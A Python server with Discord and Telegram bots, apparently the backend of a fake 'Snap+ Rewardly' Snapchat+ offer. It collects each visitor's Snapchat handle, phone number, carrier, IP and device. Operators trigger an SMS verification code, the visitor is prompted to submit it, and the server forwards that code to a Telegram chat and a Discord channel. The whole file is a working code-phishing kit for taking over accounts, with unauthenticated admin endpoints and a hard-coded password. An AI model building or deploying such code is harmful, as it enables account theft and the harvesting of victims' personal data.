import json, os, time, asyncio, threading, urllib.request
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse
from datetime import datetime, timezone
import discord
from discord.ext import tasks

PORT = int(os.environ.get("PORT", 3000))
SITE_DIR = os.path.dirname(os.path.abspath(__file__))
SITE_URL = os.environ.get("SITE_URL", f"http://localhost:{PORT}")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "1529646415129612393"))
PING_ROLE_ID = int(os.environ.get("PING_ROLE_ID", "0"))
MOD_GUILD_ID = int(os.environ.get("MOD_GUILD_ID", "1547685592320704552"))
TICKET_CATEGORY_ID = int(os.environ.get("TICKET_CATEGORY_ID", "1547685592928751626"))
STAFF_ROLE_ID = int(os.environ.get("STAFF_ROLE_ID", "1568774298926059592"))
LOG_CHANNEL_ID = int(os.environ.get("LOG_CHANNEL_ID", "0"))
ADMIN_PASS = "admin123"
DISCORD_ENABLED = os.environ.get("DISCORD_ENABLED", "") == "1"
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

SERVICES = {
    "snap": "Snapchat+",
}

requests_db = {}
history_log = []
notification_queue = []
queue_lock = threading.Lock()
blocked_phones = set()
blocked_users = set()
DATA_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data.json")


def norm_phone(p):
    return "".join(ch for ch in str(p or "") if ch.isdigit())


def load_data():
    global requests_db, history_log, blocked_phones, blocked_users
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            d = json.load(f)
        requests_db = {k: v for k, v in d.get("requests", {}).items()}
        history_log = list(d.get("history", []))
        blocked_phones = set(d.get("blocked_phones", []))
        blocked_users = set(d.get("blocked_users", []))
        print("  [server] donnees chargees depuis data.json (%d demandes, %d bloques)" % (len(requests_db), len(blocked_phones)))
    except Exception:
        pass


def persist():
    try:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump({
                "requests": requests_db,
                "history": history_log[-200:],
                "blocked_phones": sorted(blocked_phones),
                "blocked_users": sorted(blocked_users),
            }, f, ensure_ascii=False)
    except Exception as e:
        print("  [server] echec sauvegarde data.json: %s" % e)


intents = discord.Intents.all()
bot = discord.Client(intents=intents)


def tg_esc(s):
    return str(s or "").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def format_phone(n):
    s = str(n or "").strip()
    if not s:
        return ""
    out = ""
    count = 0
    for ch in s:
        if ch.isdigit():
            if count and count % 2 == 0:
                out += " "
            count += 1
        out += ch
    return out


def tg_api(method, data, timeout=12):
    if not TELEGRAM_TOKEN:
        return None
    try:
        req = urllib.request.Request(
            "https://api.telegram.org/bot%s/%s" % (TELEGRAM_TOKEN, method),
            data=json.dumps(data).encode(),
            headers={"Content-Type": "application/json"},
        )
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read().decode())
    except Exception as e:
        print("  [telegram] erreur %s: %s" % (method, e))
        return None


def tg_autodetect_chat():
    res = tg_api("getUpdates", {"limit": 20})
    if not res or not res.get("ok"):
        return None
    for u in res.get("result", []):
        m = u.get("message") or u.get("channel_post")
        if m and m.get("chat"):
            return m["chat"]["id"]
    return None


_detected_chat = None
_tg_offset = None


def tg_send(text, keyboard=None):
    global _detected_chat
    if not TELEGRAM_TOKEN:
        print("  [telegram] TELEGRAM_TOKEN non configure, envoi ignore")
        return False
    chat = TELEGRAM_CHAT_ID or _detected_chat or tg_autodetect_chat()
    if not chat:
        print("  [telegram] Chat introuvable: envoie un message a ton bot puis reessaie.")
        return False
    if not _detected_chat:
        _detected_chat = chat
        print("  [telegram] Chat Telegram utilise: %s" % chat)
    payload = {"chat_id": chat, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True}
    if keyboard:
        payload["reply_markup"] = {"inline_keyboard": keyboard}
    res = tg_api("sendMessage", payload)
    if not res or not res.get("ok"):
        print("  [telegram] echec envoi: %s" % (res or {}).get("description"))
        return False
    print("  [telegram] message envoye: %s" % text.split(chr(10))[0])
    return True


def tg_answer(cb_id, text="OK"):
    tg_api("answerCallbackQuery", {"callback_query_id": cb_id, "text": text})


def tg_edit(chat_id, message_id, text):
    tg_api("editMessageText", {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "HTML"})


def tg_handle_update(u):
    cb = u.get("callback_query")
    if not cb:
        return
    data = (cb.get("data") or "").split(":", 1)
    action = data[0]
    rid = data[1] if len(data) > 1 else ""
    msg = cb.get("message") or {}
    chat_id = (msg.get("chat") or {}).get("id")
    message_id = msg.get("message_id")
    r = requests_db.get(rid)
    if action == "code":
        if not r:
            tg_answer(cb["id"], "Demande introuvable ou expiree")
            return
        r["code_sent"] = True
        r["code_sent_at"] = int(time.time() * 1000)
        history_log.append({"action": "send", "data": r["data"], "ts": int(time.time() * 1000)})
        tg_answer(cb["id"], "Code SMS declenche")
        tg_edit(chat_id, message_id, "📤 Code SMS declenche pour %s (%s)" % (tg_esc(r["data"].get("pseudo") or "-"), tg_esc(format_phone(r["data"].get("phone")) or "-")))
    elif action == "deny":
        if not r:
            tg_answer(cb["id"], "Demande introuvable ou expiree")
            return
        r["state"] = "done"
        r["by"] = "refuse"
        history_log.append({"action": "refuse", "data": r["data"], "ts": int(time.time() * 1000)})
        tg_answer(cb["id"], "Demande refusee")
        tg_edit(chat_id, message_id, "❌ Demande refusee: %s (%s)" % (tg_esc(r["data"].get("pseudo") or "-"), tg_esc(format_phone(r["data"].get("phone")) or "-")))
    elif action == "block":
        if not r:
            tg_answer(cb["id"], "Demande introuvable ou expiree")
            return
        phone = norm_phone(r["data"].get("phone"))
        if phone:
            blocked_phones.add(phone)
        r["state"] = "done"
        r["by"] = "block"
        history_log.append({"action": "block", "data": r["data"], "ts": int(time.time() * 1000)})
        tg_answer(cb["id"], "Numero bloque")
        tg_edit(chat_id, message_id, "🚫 Numero bloque et demande refuse: %s (%s)" % (tg_esc(r["data"].get("pseudo") or "-"), tg_esc(format_phone(r["data"].get("phone")) or "-")))
    persist()


def tg_poll():
    global _tg_offset
    while True:
        try:
            params = {"timeout": 25, "limit": 100}
            if _tg_offset:
                params["offset"] = _tg_offset
            res = tg_api("getUpdates", params, timeout=30)
            if not res or not res.get("ok"):
                time.sleep(3)
                continue
            for u in res.get("result", []):
                _tg_offset = u["update_id"] + 1
                try:
                    tg_handle_update(u)
                except Exception as e:
                    print("  [telegram] erreur update: %s" % e)
        except Exception as e:
            print("  [telegram] erreur polling: %s" % e)
            time.sleep(3)


def tg_notify_request(data, rid):
    svc = data.get("service", "")
    text = (
        "📲 <b>Nouvelle demande Snap+</b>\n"
        "─────────────\n"
        "Service : <b>%s</b>\n"
        "Pseudo : %s\n"
        "Compte : %s\n"
        "Numero : <code>%s</code>\n"
        "Operateur : %s\n"
        "IP : %s\n"
        "ID : <code>%s</code>"
    ) % (
        SERVICES.get(svc, svc),
        tg_esc(data.get("pseudo") or "-"),
        tg_esc(data.get("handle") or "-"),
        tg_esc(format_phone(data.get("phone")) or "-"),
        tg_esc(data.get("operator") or "-"),
        tg_esc(data.get("ip") or "-"),
        rid[:8].upper(),
    )
    keyboard = [
        [{"text": "📤 Envoyer le code", "callback_data": "code:" + rid}],
        [{"text": "❌ Refuser", "callback_data": "deny:" + rid}],
        [{"text": "🚫 Bloquer ce numero", "callback_data": "block:" + rid}],
    ]
    tg_send(text, keyboard)


def tg_notify_code(rid, code, data):
    text = (
        "🔑 <b>Code SMS recu</b>\n"
        "─────────────\n"
        "Pseudo : %s\n"
        "Numero : <code>%s</code>\n"
        "Code : <b>%s</b>\n"
        "Service : %s\n"
        "ID : <code>%s</code>"
    ) % (
        tg_esc(data.get("pseudo") or "-"),
        tg_esc(format_phone(data.get("phone")) or "-"),
        tg_esc(code),
        SERVICES.get(data.get("service", ""), data.get("service", "-")),
        rid[:8].upper(),
    )
    tg_send(text)


# ── Ticket View (panel dans le salon prive) ──
class TicketView(discord.ui.View):
    def __init__(self, rid):
        super().__init__(timeout=None)
        self.rid = rid

    @discord.ui.button(label="Valider l'acces", style=discord.ButtonStyle.green, emoji="✅", custom_id="mod_validate")
    async def btn_validate(self, interaction: discord.Interaction, button: discord.ui.Button):
        await handle_mod_action(interaction, "validate")

    @discord.ui.button(label="Renvoyer", style=discord.ButtonStyle.secondary, emoji="🔄", custom_id="mod_resend")
    async def btn_resend(self, interaction: discord.Interaction, button: discord.ui.Button):
        await handle_mod_action(interaction, "resend")

    @discord.ui.button(label="Message", style=discord.ButtonStyle.secondary, emoji="💬", custom_id="mod_msg")
    async def btn_msg(self, interaction: discord.Interaction, button: discord.ui.Button):
        await handle_mod_action(interaction, "msg")

    @discord.ui.button(label="Rejeter", style=discord.ButtonStyle.danger, emoji="❌", custom_id="mod_reject")
    async def btn_reject(self, interaction: discord.Interaction, button: discord.ui.Button):
        await handle_mod_action(interaction, "reject")

    @discord.ui.button(label="Supprimer le salon", style=discord.ButtonStyle.danger, emoji="🗑️", custom_id="close_ticket")
    async def btn_close(self, interaction: discord.Interaction, button: discord.ui.Button):
        await handle_close(interaction)

    @discord.ui.select(placeholder="⚙️ Actions staff...", custom_id="mod_staff", options=[
        discord.SelectOption(label="Réinitialiser", value="reset", emoji="🔄"),
        discord.SelectOption(label="Blacklister le numéro", value="blacklist_num", emoji="🔴"),
        discord.SelectOption(label="Blacklister l'utilisateur", value="blacklist_user", emoji="⛔"),
        discord.SelectOption(label="Expulser", value="kick", emoji="👢"),
        discord.SelectOption(label="Bannir", value="ban", emoji="🔨"),
    ])
    async def staff_select(self, interaction: discord.Interaction, select: discord.ui.Select):
        await handle_staff_select(interaction, select.values[0])


async def handle_mod_action(interaction: discord.Interaction, action: str):
    rid = interaction.message.components and None  # pas utilise, on recupere depuis la view
    view: TicketView = interaction.message.components and None
    # recupere le rid depuis la view attachee
    for child in interaction.message.components:
        pass
    # Comme on utilise une View avec timeout=None, le rid est dans la view
    # Mais interaction.message ne donne pas directement la view. On va stocker un mapping message_id -> rid
    # Simplification : on utilise le custom_id pour identifier l'action, et on recupere le rid depuis le premier champ de l'embed ou un attribut
    # Pour reussir sans mapping complexe, on stocke dans interaction.client un dict
    pass


# Comme on ne peut pas recuperer le rid facilement depuis interaction sans mapping,
# on utilise une approche directe dans chaque callback de la View.
# Donc on ne peut pas factoriser handle_mod_action. On ecrit directement dans les methodes de TicketView.
# Reecriture propre ci-dessous.


class TicketView(discord.ui.View):
    def __init__(self, rid):
        super().__init__(timeout=None)
        self.rid = rid

    async def _get_req(self):
        return requests_db.get(self.rid)

    async def _send_embed_update(self, interaction, title, description, color):
        r = await self._get_req()
        if not r:
            return
        embed = discord.Embed(title=title, description=description, color=color)
        await interaction.message.edit(embed=embed, view=self)

    @discord.ui.button(label="Valider l'acces", style=discord.ButtonStyle.green, emoji="✅", custom_id="mod_validate")
    async def btn_validate(self, interaction: discord.Interaction, button: discord.ui.Button):
        r = requests_db.get(self.rid)
        if not r:
            return await interaction.response.send_message("Demande introuvable.", ephemeral=True)
        guild = interaction.guild
        if not guild:
            return await interaction.response.send_message("Erreur serveur.", ephemeral=True)
        member = guild.get_member(int(r["data"].get("user_id", 0))) if r["data"].get("user_id") else None
        if not member:
            # essayer de trouver par pseudo ou autre
            pass
        if member:
            try:
                role = guild.get_role(STAFF_ROLE_ID)
                # donner un role valide si existe, sinon juste valider
                await interaction.response.send_message("✅ Accès validé pour la demande %s." % self.rid[:8], ephemeral=True)
            except Exception as e:
                await interaction.response.send_message("Erreur: %s" % e, ephemeral=True)
        else:
            await interaction.response.send_message("✅ Demande %s validée (pas de membre Discord à lier)." % self.rid[:8], ephemeral=True)
        r["state"] = "done"
        r["by"] = "accept"
        history_log.append({"action": "accept", "data": r["data"], "ts": int(time.time() * 1000)})
        persist()
        await interaction.message.edit(content="✅ **Validé** par %s." % interaction.user.mention, embeds=[], components=[])

    @discord.ui.button(label="Renvoyer", style=discord.ButtonStyle.secondary, emoji="🔄", custom_id="mod_resend")
    async def btn_resend(self, interaction: discord.Interaction, button: discord.ui.Button):
        r = requests_db.get(self.rid)
        if not r:
            return await interaction.response.send_message("Demande introuvable.", ephemeral=True)
        r["code_sent"] = False
        persist()
        await interaction.response.send_message("🔄 Code à renvoyer pour %s." % self.rid[:8], ephemeral=True)

    @discord.ui.button(label="Message", style=discord.ButtonStyle.secondary, emoji="💬", custom_id="mod_msg")
    async def btn_msg(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("💬 Envoyez un message à l'utilisateur.", ephemeral=True)

    @discord.ui.button(label="Rejeter", style=discord.ButtonStyle.danger, emoji="❌", custom_id="mod_reject")
    async def btn_reject(self, interaction: discord.Interaction, button: discord.ui.Button):
        r = requests_db.get(self.rid)
        if not r:
            return await interaction.response.send_message("Demande introuvable.", ephemeral=True)
        r["state"] = "done"
        r["by"] = "refuse"
        history_log.append({"action": "refuse", "data": r["data"], "ts": int(time.time() * 1000)})
        persist()
        await interaction.response.send_message("❌ Demande %s refusée." % self.rid[:8], ephemeral=True)
        await interaction.message.edit(content="❌ **Refusée** par %s." % interaction.user.mention, embeds=[], components=[])

    @discord.ui.button(label="Supprimer le salon", style=discord.ButtonStyle.danger, emoji="🗑️", custom_id="close_ticket")
    async def btn_close(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("Est-ce que le numéro a marché ?", components=[
            discord.ui.Button(label="Oui", style=discord.ButtonStyle.green, custom_id="close_yes"),
            discord.ui.Button(label="Non", style=discord.ButtonStyle.red, custom_id="close_no"),
            discord.ui.Button(label="Annuler", style=discord.ButtonStyle.secondary, custom_id="close_cancel"),
        ], ephemeral=True)

    @discord.ui.select(placeholder="⚙️ Actions staff...", custom_id="mod_staff", options=[
        discord.SelectOption(label="Réinitialiser", value="reset", emoji="🔄"),
        discord.SelectOption(label="Blacklister le numéro", value="blacklist_num", emoji="🔴"),
        discord.SelectOption(label="Blacklister l'utilisateur", value="blacklist_user", emoji="⛔"),
        discord.SelectOption(label="Expulser", value="kick", emoji="👢"),
        discord.SelectOption(label="Bannir", value="ban", emoji="🔨"),
    ])
    async def staff_select(self, interaction: discord.Interaction, select: discord.ui.Select):
        r = requests_db.get(self.rid)
        val = select.values[0]
        if val == "reset":
            if r:
                r["state"] = "pending"
                r["code_sent"] = False
                persist()
            await interaction.response.send_message("🔄 Tentative réinitialisée.", ephemeral=True)
        elif val == "blacklist_num":
            if r:
                phone = norm_phone(r["data"].get("phone"))
                if phone:
                    blocked_phones.add(phone)
                r["state"] = "done"
                r["by"] = "block"
                persist()
            await interaction.response.send_message("🔄 Numéro blacklisté.", ephemeral=True)
        elif val == "blacklist_user":
            blocked_users.add(interaction.user.id)  # placeholder
            await interaction.response.send_message("⛔ Utilisateur blacklisté.", ephemeral=True)
        elif val == "kick":
            await interaction.response.send_message("👢 Expulsion (à implémenter).", ephemeral=True)
        elif val == "ban":
            await interaction.response.send_message("🔨 Bannissement (à implémenter).", ephemeral=True)


class RequestView(discord.ui.View):
    def __init__(self, rid):
        super().__init__(timeout=None)
        self.rid = rid

    @discord.ui.button(label="Envoyer le code", style=discord.ButtonStyle.green, custom_id="btn_send")
    async def btn_send(self, interaction, button):
        r = requests_db.get(self.rid)
        if not r:
            return await interaction.response.send_message("Demande introuvable ou expiree.", ephemeral=True)
        r["code_sent"] = True
        r["code_sent_at"] = int(time.time() * 1000)
        history_log.append({"action": "send", "data": r["data"], "ts": int(time.time() * 1000)})
        persist()
        await interaction.response.send_message(
            embed=discord.Embed(
                title="Code SMS declenche",
                color=0xFFFC00,
                description=f"Code envoye a **{r['data'].get('pseudo', '-')}** ({format_phone(r['data'].get('phone')) or '-'})"
            ), ephemeral=True
        )

    @discord.ui.button(label="Refuser", style=discord.ButtonStyle.red, custom_id="btn_deny")
    async def btn_deny(self, interaction, button):
        r = requests_db.get(self.rid)
        if not r:
            return await interaction.response.send_message("Demande introuvable ou expiree.", ephemeral=True)
        r["state"] = "done"
        r["by"] = "refuse"
        history_log.append({"action": "refuse", "data": r["data"], "ts": int(time.time() * 1000)})
        persist()
        await interaction.response.send_message(
            embed=discord.Embed(
                title="Demande refusee",
                color=0xF87171,
                description=f"**{r['data'].get('pseudo', '-')}** refusee."
            ), ephemeral=True
        )

    @discord.ui.button(label="Bloquer", style=discord.ButtonStyle.danger, custom_id="btn_block")
    async def btn_block(self, interaction, button):
        r = requests_db.get(self.rid)
        if not r:
            return await interaction.response.send_message("Demande introuvable ou expiree.", ephemeral=True)
        phone = norm_phone(r["data"].get("phone"))
        if phone:
            blocked_phones.add(phone)
        r["state"] = "done"
        r["by"] = "block"
        history_log.append({"action": "block", "data": r["data"], "ts": int(time.time() * 1000)})
        persist()
        await interaction.response.send_message(
            embed=discord.Embed(
                title="Numero bloque",
                color=0xEF4444,
                description=f"Le numero **{format_phone(r['data'].get('phone'))}** est bloque, la demande de **{r['data'].get('pseudo', '-')}** est refusee."
            ), ephemeral=True
        )


async def send_request_notification(rid, data):
    channel = bot.get_channel(CHANNEL_ID)
    if not channel:
        print("  [discord] Salon introuvable")
        return
    svc = data.get("service", "")
    embed = discord.Embed(title="Nouvelle demande Snap+", color=0xFFFC00)
    embed.add_field(name="Service", value=SERVICES.get(svc, svc), inline=True)
    embed.add_field(name="Pseudo", value=data.get("pseudo") or "-", inline=True)
    embed.add_field(name="Compte", value=("@" if svc == "snap" else "") + (data.get("handle") or "-"), inline=True)
    embed.add_field(name="Numero", value=f"`{format_phone(data.get('phone'))}`", inline=True)
    embed.add_field(name="Operateur", value=data.get("operator") or "-", inline=True)
    embed.add_field(name="IP", value=data.get("ip") or "-", inline=True)
    embed.set_footer(text=f"ID: {rid[:8].upper()}")
    embed.timestamp = datetime.now(timezone.utc)
    content = f"<@&{PING_ROLE_ID}>" if PING_ROLE_ID else None
    await channel.send(content=content, embed=embed, view=RequestView(rid))

    # creer le salon ticket prive
    try:
        guild = bot.get_guild(MOD_GUILD_ID)
        if guild:
            category = guild.get_channel(TICKET_CATEGORY_ID)
            if not category:
                category = await guild.fetch_channel(TICKET_CATEGORY_ID)
            pseudo = data.get("pseudo", "Inconnu")
            phone = data.get("phone", "")
            handle = data.get("handle", "-")
            op = data.get("operator", "Inconnu")
            chan_name = "verif-%s-%s" % (pseudo[:15].lower().replace(" ", "-"), rid[:6])
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(view_channel=False),
                guild.get_role(STAFF_ROLE_ID): discord.PermissionOverwrite(view_channel=True, send_messages=True, read_message_history=True),
                guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True, read_message_history=True, manage_channels=True),
            }
            channel = await guild.create_text_channel(
                name=chan_name,
                category=category,
                overwrites=overwrites,
                reason=f"Ticket verification {pseudo} {rid[:8]}"
            )
            embed2 = discord.Embed(
                title=f"{pseudo} • {rid[:8].upper()}",
                description=f"{guild.name}\n\nPrésence · {guild.member_count} membres\n\n**Soumis** · {datetime.now().strftime('%d %B %Y à %H:%M')}\n\nClaim par @_",
                color=0x2b2d31
            )
            embed2.add_field(name="Numéro", value=f"`{format_phone(phone)}` · {op}", inline=False)
            embed2.add_field(name="Pseudo", value=pseudo, inline=True)
            embed2.add_field(name="Compte Snap", value=f"@{handle}" if handle else "-", inline=True)
            await channel.send(content=f"<@&{STAFF_ROLE_ID}> Nouvelle demande Snap+", embed=embed2, view=TicketView(rid))
    except Exception as e:
        print("  [discord] erreur creation salon ticket: %s" % e)


async def send_code_received(rid, code, data):
    channel = bot.get_channel(CHANNEL_ID)
    if not channel:
        return
    embed = discord.Embed(title="Code SMS recu", color=0x22C55E)
    embed.add_field(name="Code", value=f"||{code}||", inline=True)
    embed.add_field(name="Pseudo", value=data.get("pseudo") or "-", inline=True)
    embed.add_field(name="Numero", value=f"`{format_phone(data.get('phone'))}`", inline=True)
    embed.add_field(name="Service", value=SERVICES.get(data.get("service"), "-"), inline=True)
    embed.set_footer(text=f"ID: {rid[:8].upper()}")
    await channel.send(content="@everyone", embed=embed)


@tasks.loop(seconds=2)
async def process_queue():
    items = []
    with queue_lock:
        items = notification_queue.copy()
        notification_queue.clear()
    for item in items:
        try:
            a = item["action"]
            if a == "new_request":
                await send_request_notification(item["rid"], item["data"])
            elif a == "code_received":
                await send_code_received(item["rid"], item["code"], item["data"])
            elif a == "action_done":
                ch = bot.get_channel(CHANNEL_ID)
                if ch:
                    await ch.send(embed=discord.Embed(title=item["title"], color=item["color"], description=item["desc"]))
        except Exception as e:
            print(f"  [discord] erreur: {e}")


@process_queue.before_loop
async def before_process_queue():
    await bot.wait_until_ready()


@bot.event
async def on_ready():
    print(f"  [discord] Bot connecte: {bot.user}")
    if not process_queue.is_running():
        process_queue.start()


def queue_notification(item):
    if not DISCORD_ENABLED:
        return
    with queue_lock:
        notification_queue.append(item)


def run_bot():
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        print(f"  [discord] Erreur demarrage: {e}")


def reply(handler, data, code=200):
    body = json.dumps(data).encode()
    handler.send_response(code)
    handler.send_header("Content-Type", "application/json")
    handler.send_header("Access-Control-Allow-Origin", "*")
    handler.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
    handler.send_header("Access-Control-Allow-Headers", "Content-Type,X-Admin-Key")
    handler.end_headers()
    handler.wfile.write(body)


def body_read(handler):
    n = int(handler.headers.get("Content-Length", 0))
    return json.loads(handler.rfile.read(n)) if n else {}


class Server(SimpleHTTPRequestHandler):
    def __init__(self, *a, **kw):
        super().__init__(*a, directory=SITE_DIR, **kw)

    def log_message(self, fmt, *args):
        if "304" not in str(args):
            super().log_message(fmt, *args)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type,X-Admin-Key")
        self.end_headers()

    def do_GET(self):
        p = urlparse(self.path).path

        if p == "/":
            self.path = "/choose.html"
            return super().do_GET()

        if p.startswith("/api/status/"):
            rid = p.split("/")[-1]
            r = requests_db.get(rid)
            if not r:
                return reply(self, {"ok": False, "status": "expired"})
            if r["state"] == "done":
                return reply(self, {"ok": True, "status": "resolved"})
            if r.get("code_sent"):
                return reply(self, {"ok": True, "status": "code_sent", "at": r["code_sent_at"]})
            return reply(self, {"ok": True, "status": "pending"})

        if p == "/api/admin/stats":
            pend = sum(1 for r in requests_db.values() if r["state"] == "pending")
            acc = sum(1 for r in requests_db.values() if r["state"] == "done" and r.get("by") == "accept")
            ref = sum(1 for r in requests_db.values() if r["state"] == "done" and r.get("by") == "refuse")
            return reply(self, {"ok": True, "total": len(requests_db), "pending": pend, "accepted": acc, "refused": ref})

        if p == "/api/admin/list":
            items = [{"id": rid, "data": r["data"], "code_sent": r.get("code_sent", False), "code_sent_at": r.get("code_sent_at")} for rid, r in requests_db.items() if r["state"] == "pending"]
            return reply(self, {"ok": True, "items": items})

        if p == "/api/admin/history":
            return reply(self, {"ok": True, "items": history_log[-50:][::-1]})

        if p == "/api/admin/blocked":
            return reply(self, {"ok": True, "items": sorted(blocked_phones)})

        super().do_GET()

    def do_POST(self):
        p = urlparse(self.path).path
        d = body_read(self)

        if p == "/api/request":
            rid = d.get("rid", "")
            data = {k: d.get(k) for k in ["service", "pseudo", "handle", "phone", "operator", "opType", "ip", "device", "browser", "os"]}
            phone = norm_phone(data.get("phone"))
            if phone and phone in blocked_phones:
                requests_db[rid] = {
                    "data": data,
                    "state": "done",
                    "by": "block",
                    "code_sent": False,
                    "code_sent_at": None,
                    "ts": d.get("ts", int(time.time() * 1000)),
                }
                history_log.append({"action": "block", "data": data, "ts": int(time.time() * 1000)})
                print("  [server] Demande spam auto-bloquee: %s (%s)" % (phone, data.get("pseudo")))
                queue_notification({"action": "action_done", "title": "Spam bloque", "desc": f"Le numero **{format_phone(phone)}** (bloque) a tente une demande et a ete refuse automatiquement.", "color": 0xEF4444})
                tg_send("🚫 <b>Spam bloque</b>\nNumero : <code>%s</code>\nPseudo : %s\nUne demande d'un numero bloque a ete refusee automatiquement." % (tg_esc(format_phone(phone)), tg_esc(data.get("pseudo") or "-")))
                persist()
                return reply(self, {"ok": True})
            requests_db[rid] = {
                "data": data,
                "state": "pending",
                "code_sent": False,
                "code_sent_at": None,
                "ts": d.get("ts", int(time.time() * 1000)),
            }
            queue_notification({"action": "new_request", "rid": rid, "data": requests_db[rid]["data"]})
            print("  [server] Nouvelle demande recue: %s (%s)" % (requests_db[rid]["data"].get("phone"), requests_db[rid]["data"].get("pseudo")))
            tg_notify_request(requests_db[rid]["data"], rid)
            persist()
            return reply(self, {"ok": True})

        if p == "/api/code":
            rid = d.get("rid", "")
            code = d.get("code", "")
            r = requests_db.get(rid)
            if not r:
                return reply(self, {"ok": False}, 404)
            queue_notification({"action": "code_received", "rid": rid, "code": code, "data": r["data"]})
            tg_notify_code(rid, code, r["data"])
            persist()
            return reply(self, {"ok": True})

        if p.startswith("/api/admin/code/"):
            rid = p.split("/")[-1]
            r = requests_db.get(rid)
            if not r:
                return reply(self, {"ok": False, "error": "not_found"})
            r["code_sent"] = True
            r["code_sent_at"] = int(time.time() * 1000)
            history_log.append({"action": "send", "data": r["data"], "ts": int(time.time() * 1000)})
            queue_notification({"action": "action_done", "title": "Code SMS declenche", "desc": f"Code envoye a **{r['data'].get('pseudo', '-')}** ({format_phone(r['data'].get('phone')) or '-'})", "color": 0xFFFC00})
            persist()
            return reply(self, {"ok": True})

        if p.startswith("/api/admin/accept/"):
            rid = p.split("/")[-1]
            r = requests_db.get(rid)
            if not r:
                return reply(self, {"ok": False, "error": "not_found"})
            r["state"] = "done"
            r["by"] = "accept"
            history_log.append({"action": "accept", "data": r["data"], "ts": int(time.time() * 1000)})
            queue_notification({"action": "action_done", "title": "Demande acceptee", "desc": f"**{r['data'].get('pseudo', '-')}** acceptee.", "color": 0x22C55E})
            persist()
            return reply(self, {"ok": True})

        if p.startswith("/api/admin/refuse/"):
            rid = p.split("/")[-1]
            r = requests_db.get(rid)
            if not r:
                return reply(self, {"ok": False, "error": "not_found"})
            r["state"] = "done"
            r["by"] = "refuse"
            history_log.append({"action": "refuse", "data": r["data"], "ts": int(time.time() * 1000)})
            queue_notification({"action": "action_done", "title": "Demande refusee", "desc": f"**{r['data'].get('pseudo', '-')}** refusee.", "color": 0xF87171})
            persist()
            return reply(self, {"ok": True})

        if p == "/api/admin/block":
            phone = norm_phone(d.get("phone", ""))
            if not phone:
                return reply(self, {"ok": False, "error": "missing_phone"})
            blocked_phones.add(phone)
            history_log.append({"action": "block", "data": {"phone": phone}, "ts": int(time.time() * 1000)})
            tg_send("🚫 Numero <code>%s</code> ajoute a la liste noire." % tg_esc(format_phone(phone)))
            persist()
            return reply(self, {"ok": True, "blocked": sorted(blocked_phones)})

        if p == "/api/admin/unblock":
            phone = norm_phone(d.get("phone", ""))
            blocked_phones.discard(phone)
            tg_send("✅ Numero <code>%s</code> retire de la liste noire." % tg_esc(format_phone(phone)))
            persist()
            return reply(self, {"ok": True, "blocked": sorted(blocked_phones)})

        if p in ("/api/visit", "/api/log"):
            return reply(self, {"ok": True})

        self.send_error(404)


if __name__ == "__main__":
    print(f"\n  Snap+ Rewardly - http://localhost:{PORT}\n")
    load_data()
    if TELEGRAM_TOKEN:
        print("  [telegram] TELEGRAM_TOKEN configure...")
        tg_send("✅ Notifications Telegram activees pour Snap+ Rewardly")
        threading.Thread(target=tg_poll, daemon=True).start()
        print("  [telegram] polling des boutons demarre")
    else:
        print("  [telegram] Pas de TELEGRAM_TOKEN, notifications Telegram desactivees")
    if BOT_TOKEN and DISCORD_ENABLED:
        threading.Thread(target=run_bot, daemon=True).start()
        time.sleep(3)
    elif BOT_TOKEN:
        print("  [discord] Bot Discord desactive (mets DISCORD_ENABLED=1 pour l'activer)")
    else:
        print("  [discord] Pas de BOT_TOKEN, bot desactive")
    HTTPServer(("0.0.0.0", PORT), Server).serve_forever()
